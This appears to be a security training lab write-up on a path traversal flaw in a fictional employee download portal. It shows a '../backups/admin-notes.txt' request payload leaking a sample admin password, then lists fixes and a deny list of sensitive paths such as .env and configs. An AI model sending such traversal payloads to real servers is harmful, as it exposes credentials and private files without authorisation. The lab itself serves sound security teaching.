# Path Traversal Lab — Internal Backup Leak

## Lab Overview

This lab demonstrates a **Path Traversal vulnerability** where users can escape intended download directories and access sensitive files stored elsewhere on the server.

Attackers exploit improper file path validation to retrieve internal backups and confidential information.

---

## Vulnerability Type

Path Traversal / Directory Traversal

OWASP Category:

A01:2021 — Broken Access Control

A05:2021 — Security Misconfiguration

---

## Scenario

Employees can download onboarding documents.

Allowed files:

```text
manual.txt
welcome.txt
```

Application endpoint:

GET

```text
/api/files/download?file=manual.txt
```

The application fails to validate file paths properly.

---

## Normal Usage

Request:

```text
/api/files/download?file=manual.txt
```

Response:

```text
Employee File Portal

Available documents:
- welcome.txt
- manual.txt
```

---

## Enumeration Clues

Manuals mention:

```text
Backup files moved to:
/backups/

Admin notes archived.
```

Users may suspect hidden files exist.

---

## Exploit Payload

Modify request:

From:

```text
manual.txt
```

To:

```text
../backups/admin-notes.txt
```

Request:

```text
GET
/api/files/download?file=../backups/admin-notes.txt
```

---

## Successful Exploitation

Response:

```text
Admin Notes

Username:
admin@vulnlab.local

Password:
Admin@2026!
```

---

## Impact

Attacker gains:

✔ Internal credentials

✔ Backup exposure

✔ Sensitive information leakage

Possible consequences:

```text
Credential theft
Privilege escalation
Unauthorized access
```

---

## Root Cause

Application trusts user-controlled filenames:

Example:

```text
download?file=user_input
```

without restricting:

```text
../
../../
```

Directory traversal becomes possible.

---

## Secure Fixes

### Allowlist filenames

Only permit:

```text
manual.txt
welcome.txt
```

---

### Normalize paths

Reject:

```text
../
..\

absolute paths
```

---

### Restrict file access

Never expose:

```text
backups/
configs/
logs/
.env
```

through download endpoints.

---

## Learning Objectives

After completing this lab learners should understand:

- Path Traversal vulnerabilities
- Directory escaping
- Sensitive file disclosure
- Backup exposure risks
- Secure file handling

---

## Lab Information

Lab:

Path Traversal — Internal Backup Leak

Difficulty:

Medium–Hard

Category:

File Handling / Access Control

Status:

✔ Completed